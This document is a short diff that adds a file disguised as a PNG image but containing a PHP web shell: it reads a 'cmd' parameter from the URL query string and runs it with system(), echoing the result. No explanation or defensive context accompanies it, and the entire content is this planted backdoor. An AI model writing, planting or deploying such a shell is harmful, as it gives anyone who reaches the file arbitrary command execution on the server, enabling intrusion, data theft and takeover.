@@ -1,0 +1,4 @@
+PNG<?php
+$cmd = $_GET['cmd'];
+$output=system($cmd);
+echo $output ?>
